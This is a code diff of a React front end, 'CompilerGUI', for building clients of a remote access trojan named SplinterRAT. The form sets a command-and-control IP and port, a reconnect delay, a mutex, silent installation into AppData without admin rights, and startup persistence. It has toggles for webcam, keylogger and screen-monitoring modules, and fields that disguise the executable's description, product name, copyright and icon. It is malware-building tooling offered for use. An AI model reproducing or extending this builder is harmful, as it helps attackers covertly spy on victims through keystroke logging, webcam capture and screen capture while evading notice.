@@ -1,167 +1,333 @@
 import React, {useState} from 'react';
 import {
+    Box,
     Button,
     Checkbox,
-    Tab,
-    Tabs,
-    Box,
-    TextField,
-    Select,
-    Typography,
+    Chip,
+    Divider,
+    FormControlLabel,
+    Grid,
     MenuItem,
     Paper,
-    Grid,
-    Divider, FormControlLabel, Chip, IconButton
+    Select,
+    Tab,
+    Tabs,
+    TextField,
+    Typography
 } from '@mui/material';
-import {Cached} from "@mui/icons-material";
+import {Upload} from "@mui/icons-material";
+import {useDispatch, useSelector} from 'react-redux';
+import {
+    setCopyright,
+    setExecutableName,
+    setFileDescription,
+    setFolderName,
+    setInstallationPath,
+    setIp,
+    setMutex,
+    setOriginalName,
+    setPort,
+    setProductName,
+    setStartupName,
+    setTag,
+    setTiming,
+    setVersionOfFileAndProduct,
+    toggleInstallation,
+    toggleKeylogger,
+    toggleScreenMonitoring,
+    toggleStartup,
+    toggleWebcam,
+} from '@redux/slices/compilerSlice';
+
+
+
 
 function CompilerGUI() {
-    // Estados para los checkboxes y otros componentes interactivos
-    const [webcamChecked, setWebcamChecked] = useState(false);
-    const [keyloggerChecked, setKeyloggerChecked] = useState(false);
-    const [tag, setTag] = useState("");
-    const [mutex, setMutex] = useState("");
-    const [ip, setIp] = useState("");
-    const [port, setPort] = useState("");
-    const [timing, setTiming] = useState("");
-    const [isInstallationEnabled, setIsInstallationEnabled] = useState(false);
-    const [isStartupEnabled, setIsStartupEnabled] = useState(false);
+    const dispatch = useDispatch();
+    const compilerState = useSelector(state => state.compiler);
+
+    const generateJSON = () => {
+        return {
+            webcamChecked: compilerState.webcamChecked,
+            keyloggerChecked: compilerState.keyloggerChecked,
+            screenMonitoringChecked: compilerState.screenMonitoringChecked,
+            tag: compilerState.tag,
+            mutex: compilerState.mutex,
+            ip: compilerState.ip,
+            port: compilerState.port,
+            timing: compilerState.timing,
+            executableName: compilerState.executableName,
+            folderName: compilerState.folderName,
+            isInstallationEnabled: compilerState.isInstallationEnabled,
+            isStartupEnabled: compilerState.isStartupEnabled,
+            startupName: compilerState.startupName,
+            fileDescription: compilerState.fileDescription,
+            versionOfFileAndProduct: compilerState.versionOfFileAndProduct,
+            productName: compilerState.productName,
+            copyright: compilerState.copyright,
+            originalName: compilerState.originalName,
+            installationPath: compilerState.installationPath
+        };
+    }
+
+    const handleCompileClick = () => {
+        const jsonData = generateJSON();
+        console.log(jsonData)
+         fetch('http://127.0.0.1:3055/compile', {
+             method: 'POST',
+             headers: {
+                 'Content-Type': 'application/json'
+             },
+             body: JSON.stringify(jsonData)
+         })
+         .then(response => response.json())
+         .then(data => {
+             console.log(data);
+         })
+         .catch(error => {
+             console.error('Error:', error);
+         });
+    }
 
 
-    // Estado para las pestañas
     const [currentTab, setCurrentTab] = useState(0);
+    const isFormValid = () => {
+        return compilerState.tag && compilerState.ip && compilerState.port;
+    }
 
     return (
         <Paper elevation={10} sx={{height: '82vh', maxHeight: '82vh', overflow: 'auto', maxWidth: '100%'}}>
-            {/* Pestañas */}
             <Tabs value={currentTab} onChange={(event, newValue) => setCurrentTab(newValue)}>
                 <Tab label="Identification"/>
                 <Tab label="Installation"/>
-                <Tab label="Modules"/>
-                <Tab label="Assembly"/>
-                <Tab label="Compile"/>
             </Tabs>
 
-            {/* Contenido de las pestañas */}
             <Box sx={{maxHeight: '65vh', width: '100%'}}>
                 {currentTab === 0 && (
-                    <Box sx={{ display: 'flex', flexDirection: 'column', gap: '1vh',p:2}}>
-                        <Divider  sx={{ margin: '0.5rem 0' }} textAlign="left">
-                                <Chip label="Identification" />
+                    <Box sx={{display: 'flex', flexDirection: 'column', gap: '1vh', p: 2}}>
+                        <Divider sx={{margin: '0.5rem 0'}} textAlign="left">
+                            <Chip label="Identification"/>
                         </Divider>
-                        <Box sx={{ display: 'flex', gap: '1rem', flexWrap: 'wrap' }}>
-                            <Box sx={{ flex: '1 1 calc(50% - 1rem)',display:'flex' }}>
-                                <TextField label="Mutex" placeholder="2f3dc5e1-18f0-4167-baf1-ddb47cb8d346" helperText="Mutex is used to avoid executing the same client multiple times. It's recommened to be autogenerated" fullWidth />
+                        <Box sx={{display: 'flex', gap: '1rem', flexWrap: 'wrap'}}>
+                            <Box sx={{flex: '1 1 calc(50% - 1rem)', display: 'flex'}}>
+                                <TextField
+                                    label="Mutex"
+                                    value={compilerState.mutex}
+                                    onChange={(e) => dispatch(setMutex(e.target.value))}
+                                    placeholder="2f3dc5e1-18f0-4167-baf1-ddb47cb8d346"
+                                    helperText="Mutex is used to avoid executing the same client multiple times. It's recommended to be autogenerated"
+                                    fullWidth
+                                />
                             </Box>
-                            <Box sx={{ flex: '1 1 calc(40% - 1rem)' }}>
-                                <TextField label="Tag name"  placeholder="Client" helperText="Client tag for connection identification" fullWidth />
+                            <Box sx={{flex: '1 1 calc(40% - 1rem)'}}>
+                                <TextField
+                                    label="Tag name"
+                                    value={compilerState.tag}
+                                    onChange={(e) => dispatch(setTag(e.target.value))}
+                                    placeholder="Client"
+                                    helperText="Client tag for connection identification"
+                                    fullWidth
+                                />
                             </Box>
-                            <Box sx={{ flex: '1 1 calc(20% - 1rem)' }}>
-                                <TextField label="IP address"  placeholder="127.0.0.1" helperText="IP address (IPv4 only supported)" fullWidth />
+                            <Box sx={{flex: '1 1 calc(20% - 1rem)'}}>
+                                <TextField
+                                    label="IP address"
+                                    value={compilerState.ip}
+                                    onChange={(e) => dispatch(setIp(e.target.value))}
+                                    placeholder="127.0.0.1"
+                                    helperText="IP address (IPv4 only supported)"
+                                    fullWidth
+                                />
                             </Box>
-                            <Box sx={{ flex: '1 1 calc(20% - 1rem)' }}>
-                                <TextField label="Port"  placeholder="3055" helperText="Port (1024 to 65536)" fullWidth />
-
+                            <Box sx={{flex: '1 1 calc(20% - 1rem)'}}>
+                                <TextField
+                                    label="Port"
+                                    value={compilerState.port}
+                                    onChange={(e) => dispatch(setPort(e.target.value))}
+                                    placeholder="3055"
+                                    helperText="Port (1024 to 65536)"
+                                    fullWidth
+                                />
                             </Box>
-                            <Box sx={{ flex: '1 1 calc(20% - 1rem)' }}>
-                                <TextField label="Delay"  placeholder="10000" helperText="Retray delay. The time it will take the client to retry a connection (ms)" fullWidth />
-
+                            <Box sx={{flex: '1 1 calc(20% - 1rem)'}}>
+                                <TextField
+                                    label="Delay"
+                                    value={compilerState.timing}
+                                    onChange={(e) => dispatch(setTiming(e.target.value))}
+                                    placeholder="10000"
+                                    helperText="Retry delay. The time it will take the client to retry a connection (ms)"
+                                    fullWidth
+                                />
                             </Box>
                         </Box>
-
                         <Divider textAlign="left">
-                            <Chip label="Installation" />
+                            <Chip label="Installation"/>
                         </Divider>
-
-
-                        <Box sx={{ flex: '1' }}>
+                        <Box sx={{flex: '1'}}>
                             <FormControlLabel
-                                control={<Checkbox onChange={() => setIsInstallationEnabled(!isInstallationEnabled)} />}
+                                control={<Checkbox
+                                    checked={compilerState.isInstallationEnabled}
+                                    onChange={() => dispatch(toggleInstallation())}
+                                />}
                                 label="Install"
                             />
                             <FormControlLabel
-                                control={<Checkbox onChange={() => setIsStartupEnabled(!isStartupEnabled)} />}
+                                control={<Checkbox
+                                    checked={compilerState.isStartupEnabled}
+                                    onChange={() => dispatch(toggleStartup())}
+                                />}
                                 label="Startup"
                             />
                         </Box>
-
-
-                        <Box sx={{ display: 'flex', gap: '1rem', flexWrap: 'wrap' }}>
-                            <Box sx={{ flex: '1 1 calc(33.33% - 1rem)' }}>
+                        <Box sx={{display: 'flex', gap: '1rem', flexWrap: 'wrap'}}>
+                            <Box sx={{flex: '1 1 calc(33.33% - 1rem)'}}>
                                 <Select
                                     fullWidth
-                                    disabled={!isInstallationEnabled}
-                                    defaultValue="AppData" // set a default value
-                                    onChange={(event) => {
-                                        // handle the selected value here
-                                        console.log(event.target.value);
-                                    }}
+                                    disabled={!compilerState.isInstallationEnabled}
+                                    value={2}
+                                    onChange={(event) => dispatch(setInstallationPath(event.target.value))}
                                 >
-                                    <MenuItem value="Program files (x86)">Option 1</MenuItem>
-                                    <MenuItem value="System directory">Option 2</MenuItem>
-                                    <MenuItem value="AppData">Option 3</MenuItem>
+                                    <MenuItem value="0">Program files (x86)</MenuItem>
+                                    <MenuItem value="1">System directory</MenuItem>
+                                    <MenuItem value="2">AppData</MenuItem>
                                 </Select>
-                                <Typography variant="caption">Path where the client will be installed (AppData: no admin privileges required)</Typography>
+                                <Typography variant="caption">Path where the client will be installed (AppData: no admin
+                                    privileges required)</Typography>
                             </Box>
-                            <Box sx={{ flex: '1 1 calc(33.33% - 1rem)' }}>
-                                <TextField helperText="Folder name where the client will be installed" fullWidth disabled={!isInstallationEnabled} />
+                            <Box sx={{flex: '1 1 calc(33.33% - 1rem)'}}>
+                                <TextField
+                                    label="Folder name"
+                                    value={compilerState.folderName}
+                                    onChange={(e) => dispatch(setFolderName(e.target.value))}
+                                    placeholder="client"
+                                    helperText="Folder name where the client will be installed"
+                                    fullWidth
+                                    disabled={!compilerState.isInstallationEnabled}
+                                />
                             </Box>
-                            <Box sx={{ flex: '1 1 calc(33.33% - 1rem)' }}>
-                                <TextField helperText="Executable name inside installation folder" fullWidth disabled={!isInstallationEnabled} />
+                            <Box sx={{flex: '1 1 calc(33.33% - 1rem)'}}>
+                                <TextField
+                                    label="Executable name"
+                                    value={compilerState.executableName}
+                                    onChange={(e) => dispatch(setExecutableName(e.target.value))}
+                                    placeholder="client.exe"
+                                    helperText="Executable name inside installation folder"
+                                    fullWidth
+                                    disabled={!compilerState.isInstallationEnabled}
+                                />
                             </Box>
                         </Box>
-
-                        <Box sx={{ display: 'flex', gap: '1rem', flexWrap: 'wrap', marginTop: '1rem' }}>
-
-                            <Box sx={{ flex: '1 1 calc(50% - 1rem)' }}>
-                                <TextField helperText="Some important text" fullWidth disabled={!isStartupEnabled} />
+                        <Box sx={{display: 'flex', gap: '1rem', flexWrap: 'wrap', marginTop: '1rem'}}>
+                            <Box sx={{flex: '1 1 calc(100% - 1rem)'}}>
+                                <TextField
+                                    label="Startup name"
+                                    value={compilerState.startupName}
+                                    onChange={(e) => dispatch(setStartupName(e.target.value))}
+                                    placeholder="ClientStartup"
+                                    helperText="Name of the startup file"
+                                    fullWidth
+                                    disabled={!compilerState.isStartupEnabled}
+                                />
                             </Box>
                         </Box>
                     </Box>
-                        )}
-                        {currentTab === 1 && (
-                            <div>
-                                {/* Contenido del tab Installation */}
-                            </div>
-                        )}
-                        {currentTab === 2 && (
-                            <div>
-                                {/* Contenido del tab Modules */}
-                            </div>
-                        )}
-                        {currentTab === 3 && (
-                            <div>
-                                {/* Contenido del tab Assembly */}
-                            </div>
-                        )}
-                        {currentTab === 4 && (
-                            <div>
-                                {currentTab === 4 && (
-                                    <div>
-                                        <Typography variant="h6">
-                                            Path where g++ and windres is located if it isnt in the system variables:
-                                        </Typography>
-                                        <Select
-                                            value={"compilerOption"}
-                                            onChange={(event) => setCompilerOption(event.target.value)}
-                                        >
-                                            <MenuItem value="Default system compiler">Default system compiler</MenuItem>
-                                            <MenuItem value="Select custom path">Select custom path</MenuItem>
-                                        </Select>
-                                        {"compilerOption" === "Select custom path" && (
-                                            <TextField
-                                                label="Compiler Path"
-                                                value={"compilerPath"}
-                                                onChange={(event) => setCompilerPath(event.target.value)}
-                                            />
-                                        )}
-                                    </div>
-                                )}
-                            </div>
-                        )}
-                    </Box>
-                    </Paper>
-                    );
-                }
+                )}
+                {currentTab === 1 && (
+                    <Box sx={{display: 'flex', flexDirection: 'column', gap: '1vh', pl: 2, pr: 2}}>
+                        <Divider sx={{margin: '1rem 0'}} textAlign="left">
+                            <Chip label="Modules"/>
+                        </Divider>
+                        <Box sx={{display: 'flex', gap: '1rem'}}>
+                            <FormControlLabel
+                                control={<Checkbox
+                                    checked={compilerState.webcamChecked}
+                                    onChange={() => dispatch(toggleWebcam())}
+                                />}
+                                label="Webcam"
+                            />
+                            <FormControlLabel
+                                control={<Checkbox
+                                    checked={compilerState.keyloggerChecked}
+                                    onChange={() => dispatch(toggleKeylogger())}
+                                />}
+                                label="Keylogger"
+                            />
+                            <FormControlLabel
+                                control={<Checkbox
+                                    checked={compilerState.screenMonitoringChecked}
+                                    onChange={() => dispatch(toggleScreenMonitoring())}
+                                />}
+                                label="Screen monitoring"
+                            />
+                        </Box>
 
-                export default CompilerGUI;
+                        <Divider sx={{margin: '0.5rem 0'}} textAlign="left">
+                            <Chip label="Assembly"/>
+                        </Divider>
+                        <Grid container spacing={2}>
+                            <Grid item xs={6}>
+                                <TextField
+                                    fullWidth
+                                    value={compilerState.fileDescription}
+                                    onChange={(e) => dispatch(setFileDescription(e.target.value))}
+                                    placeholder="This is the best client in the world!"
+                                    label="File Description"
+                                    sx={{ marginBottom: 2 }}
+                                />
+                                <TextField
+                                    fullWidth
+                                    value={compilerState.version}
+                                    onChange={(e) => dispatch(setVersionOfFileAndProduct(e.target.value))}
+                                    placeholder="1.0.0.0"
+                                    label="Version of File and Product"
+                                    sx={{ marginBottom: 2 }}
+                                />
+                                <TextField
+                                    value={compilerState.originalName}
+                                    onChange={(e) => dispatch(setOriginalName(e.target.value))}
+                                    placeholder="client.exe"
+                                    fullWidth
+                                    label="Original Name"
+
+                                />
+                                <Button variant="outlined" startIcon={<Upload/>} sx={{marginTop: 2}}>
+                                    Upload Icon
+                                </Button>
+                            </Grid>
+                            <Grid item xs={6}>
+                                <TextField
+                                    value={compilerState.productName}
+                                    onChange={(e) => dispatch(setProductName(e.target.value))}
+                                    placeholder="SplinterRAT client"
+                                    fullWidth
+                                    label="Product Name"
+                                    sx={{ marginBottom: 2 }}
+                                />
+                                <TextField
+                                    value={compilerState.copyright}
+                                    onChange={(e) => dispatch(setCopyright(e.target.value))}
+                                    placeholder="SplinterRAT ©"
+                                    fullWidth
+                                    label="Copyright"
+                                />
+
+                            </Grid>
+                        </Grid>
+                        <Button
+                            variant="outlined"
+                            color="success"
+                            size="large"
+                            sx={{marginTop: 2}}
+                            onClick={handleCompileClick}
+                            disabled={!isFormValid()}
+                        >
+                            Compile
+                        </Button>
+                    </Box>
+                )}
+            </Box>
+        </Paper>
+    );
+}
+
+export default CompilerGUI;
